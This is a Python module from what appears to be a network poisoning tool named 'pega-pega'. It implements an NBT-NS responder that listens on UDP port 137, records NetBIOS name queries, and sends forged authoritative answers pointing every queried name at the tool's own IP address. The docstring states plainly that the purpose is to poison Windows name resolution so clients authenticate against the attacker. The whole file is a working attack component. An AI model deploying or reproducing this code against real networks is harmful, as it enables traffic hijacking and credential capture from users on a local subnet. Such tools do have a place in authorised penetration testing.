"""NBT-NS (NetBIOS Name Service) responder.

Listens on UDP 137 and responds to all NetBIOS name queries with our IP,
poisoning name resolution for Windows clients.

NetBIOS name queries are broadcast on the local subnet. By responding
first, we redirect the client to authenticate against us.
"""

import asyncio
import logging
import socket
import struct

from .base import BaseProtocolHandler
from ..models import CapturedRequest, Protocol

logger = logging.getLogger("pega-pega")


class _NbtnsProtocol(asyncio.DatagramProtocol):
    def __init__(self, handler: "NbtnsHandler"):
        self.handler = handler
        self.transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport: asyncio.DatagramTransport):
        self.transport = transport

    def datagram_received(self, data: bytes, addr: tuple):
        asyncio.ensure_future(self._handle(data, addr))

    def error_received(self, exc: Exception):
        logger.debug("NBT-NS error: %s", exc)

    async def _handle(self, data: bytes, addr: tuple):
        source_ip, source_port = addr[0], addr[1]

        if len(data) < 12:
            return

        # Parse NBT-NS header (similar to DNS)
        txn_id = struct.unpack("!H", data[0:2])[0]
        flags = struct.unpack("!H", data[2:4])[0]
        opcode = (flags >> 11) & 0xF
        qr = (flags >> 15) & 1

        if qr == 1:
            return  # This is a response

        # Only handle name queries (opcode 0)
        if opcode != 0:
            return

        qdcount = struct.unpack("!H", data[4:6])[0]
        if qdcount == 0:
            return

        # Parse NetBIOS encoded name
        name = _decode_nbtns_name(data, 12)
        if not name:
            return

        summary = f"QUERY {name}"

        await self.handler.emit(CapturedRequest(
            protocol=Protocol.NBTNS,
            source_ip=source_ip,
            source_port=source_port,
            dest_port=self.handler.port,
            summary=summary,
            details={
                "name": name,
                "txn_id": txn_id,
                "operation": "QUERY",
            },
            raw_data=data,
        ))

        logger.info("NBT-NS %s from %s:%d → responding with %s",
                    name, source_ip, source_port, self.handler.response_ip)

        # Build poisoned response
        response = _build_nbtns_response(txn_id, data, self.handler.response_ip)
        if response and self.transport:
            self.transport.sendto(response, addr)


class NbtnsHandler(BaseProtocolHandler):
    name = "NBT-NS"
    default_port = 137

    @property
    def response_ip(self) -> str:
        return self.global_config.get_response_ip()

    async def start(self):
        loop = asyncio.get_running_loop()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        except (AttributeError, OSError):
            pass
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.bind((self.bind, self.port))

        transport, _ = await loop.create_datagram_endpoint(
            lambda: _NbtnsProtocol(self),
            sock=sock,
        )
        self._servers.append(transport)
        logger.info("NBT-NS handler listening on %s:%d", self.bind, self.port)


def _decode_nbtns_name(data: bytes, offset: int) -> str:
    """Decode a NetBIOS first-level encoded name.

    NetBIOS names are encoded as a 32-byte string where each original byte
    is split into two bytes: high nibble + 'A', low nibble + 'A'.
    """
    if offset >= len(data):
        return ""

    length = data[offset]
    offset += 1

    if length != 32:
        # Not a standard NetBIOS encoded name
        return ""

    if offset + 32 > len(data):
        return ""

    encoded = data[offset:offset + 32]
    name_bytes = bytearray()
    for i in range(0, 32, 2):
        high = (encoded[i] - ord('A')) & 0xF
        low = (encoded[i + 1] - ord('A')) & 0xF
        name_bytes.append((high << 4) | low)

    # Strip trailing spaces and the suffix byte
    name = name_bytes[:15].decode("ascii", errors="replace").rstrip()
    suffix = name_bytes[15] if len(name_bytes) > 15 else 0

    suffix_names = {
        0x00: "Workstation",
        0x20: "File Server",
        0x1B: "Domain Master",
        0x1C: "Domain Controller",
        0x1D: "Master Browser",
    }
    suffix_label = suffix_names.get(suffix, f"0x{suffix:02X}")

    return f"{name} <{suffix_label}>"


def _build_nbtns_response(txn_id: int, query: bytes, response_ip: str) -> bytes:
    """Build an NBT-NS positive name query response."""
    # Header: QR=1, Opcode=0, AA=1, RD=0, RA=0
    # Flags: 0x8500 (response, authoritative)
    header = struct.pack("!HHHHHH", txn_id, 0x8500, 0, 1, 0, 0)

    # Answer RR: copy the name from the query (starts at offset 12)
    # Find end of name
    offset = 12
    while offset < len(query) and query[offset] != 0:
        length = query[offset]
        offset += 1 + length
    offset += 1  # skip null terminator

    name_section = query[12:offset]

    # TYPE NB (0x0020), CLASS IN (0x0001), TTL 300
    answer = name_section
    answer += struct.pack("!HHI", 0x0020, 0x0001, 300)
    # RDLENGTH = 6 (2 bytes flags + 4 bytes IP)
    answer += struct.pack("!H", 6)
    # NB flags: B-node, unique
    answer += struct.pack("!H", 0x0000)
    answer += socket.inet_aton(response_ip)

    return header + answer
